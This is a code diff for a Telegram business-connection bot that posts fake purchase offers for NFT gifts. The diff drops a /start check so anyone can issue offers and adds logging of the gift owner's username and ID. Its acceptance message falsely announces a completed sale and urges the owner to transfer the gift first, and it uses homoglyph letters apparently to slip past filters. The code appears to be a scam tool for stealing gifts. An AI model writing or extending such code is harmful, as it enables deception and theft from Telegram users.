@@ -36,10 +36,9 @@ business_owner_ids: dict[str, int] = {}
 offers: dict[str, dict] = {}
 
 # ============================================================
-# БАЗА ДАННЫХ (В ПАМЯТИ)
+# БАЗА БАНОВ
 # ============================================================
 banned_users: set[str] = set()
-started_users: set[int] = set() # Те, кто нажал /start
 
 def is_banned(user_id: int, username: str | None) -> bool:
     if str(user_id) in banned_users: return True
@@ -95,12 +94,10 @@ def get_log_text(data: dict, status: str, is_read: bool = False) -> str:
         emoji_id, emoji_char, currency_name = EMOJI_STARS, "⭐", "Stars"
     emoji_tag = f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'
 
-    log_prefix = f'<tg-emoji emoji-id="{EMOJI_ACCEPT}">✅</tg-emoji>'
-
     return (
-        f"{log_prefix} <b>Оффер отправлен.</b>\n\n"
+        f"<b>{EMOJI_ACCEPT} Оффер отправлен.</b>\n\n"
         f"<b>Отправил:</b> @{data['sender_username']} | {data['sender_id']}\n"
-        f"<b>Владелец подарка:</b> ❌ Недоступно (ограничение Telegram)\n"
+        f"<b>Отправлен:</b> @{data.get('owner_username', 'unknown')} | {data.get('owner_id', '0')}\n"
         f"<b>Подарок:</b> {gift_display}\n"
         f"<b>Валюта:</b> {emoji_tag} {currency_name}\n"
         f"<b>Сумма:</b> {data['amount']}\n\n"
@@ -200,25 +197,6 @@ async def cmd_banlist(message: Message):
     await message.answer("<b>🚫 Забаненные:</b>\n\n" + "\n".join(f"• <code>{b}</code>" for b in sorted(banned_users)))
 
 # ============================================================
-# СТАРТ
-# ============================================================
-@dp.message(F.text == "/start")
-async def cmd_start(message: Message):
-    if message.from_user:
-        started_users.add(message.from_user.id)
-    
-    text = (
-        "<b>Как начать:</b>\n\n"
-        "<b>/delitpr</b>\n\n"
-        "Отправь команду в чат с покупателем:\n"
-        "<code>/delitpr ссылка_на_нфт цена gram / stars</code>\n\n"
-        "Примеры:\n"
-        "<code>/delitpr https://t.me/nft/SkyStilettos-22484 222 stars</code>\n"
-        "<code>/delitpr https://t.me/nft/SkyStilettos-22484 222 gram</code>"
-    )
-    await message.answer(text)
-
-# ============================================================
 # БИЗНЕС-ЛОГИКА (AIogram)
 # ============================================================
 @dp.business_connection()
@@ -233,14 +211,7 @@ async def handle_offer(message: Message) -> None:
     sender_id = message.from_user.id if message.from_user else 0
     sender_username = message.from_user.username if message.from_user else None
 
-    # 1. Проверка на /start
-    if sender_id not in started_users:
-        logger.warning(f"[offer] User {sender_id} not started, deleting message.")
-        try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[message.message_id])
-        except: pass
-        return
-
-    # 2. Проверка на бан
+    # Бан
     if is_banned(sender_id, sender_username):
         try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[message.message_id])
         except: pass
@@ -248,7 +219,7 @@ async def handle_offer(message: Message) -> None:
         except: pass
         return
 
-    # 3. Проверка прав
+    # Права
     try:
         connection = await bot.get_business_connection(business_connection_id=bc_id)
         rights = connection.rights
@@ -261,7 +232,7 @@ async def handle_offer(message: Message) -> None:
         logger.error(f"[BC] Ошибка прав: {e}")
         return
 
-    # 4. Парсинг
+    # Парсинг
     data = parse_offer_command(message.text)
     if not data: return
 
@@ -273,6 +244,7 @@ async def handle_offer(message: Message) -> None:
 
     await asyncio.sleep(3)
     
+    # ПАРСИНГ ИМЕНИ
     amount_fmt = f"{int(data['amount']):,}"
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
     emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if data["currency"] == "gram" else EMOJI_STARS}">{"🪙" if data["currency"] == "gram" else "⭐"}</tg-emoji>'
@@ -322,6 +294,8 @@ async def handle_accept(callback: CallbackQuery) -> None:
     await asyncio.sleep(0.3)
 
     amount_fmt = f"{int(data['amount']):,}"
+    
+    # Ссылка вшита в название подарка
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
     
     if data["currency"] == "gram":
@@ -331,6 +305,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
 
     sold_emoji = f'<tg-emoji emoji-id="{EMOJI_SOLD}">✨</tg-emoji>'
 
+    # Ссылку отдельно не пишем, она уже внутри gift_display
     accept_text = (
         f"{sold_emoji} Gift {gift_display} hаs bееn suссеssfullу sоld fоr <b>{amount_fmt}</b> {emoji} <b>{cur_word}</b>!\n\n"
         f"Tо соmрlеtе thе dеаl, trаnsfеr thе gift tо thе buуеr tо rесеivе уоur {cur_word}"
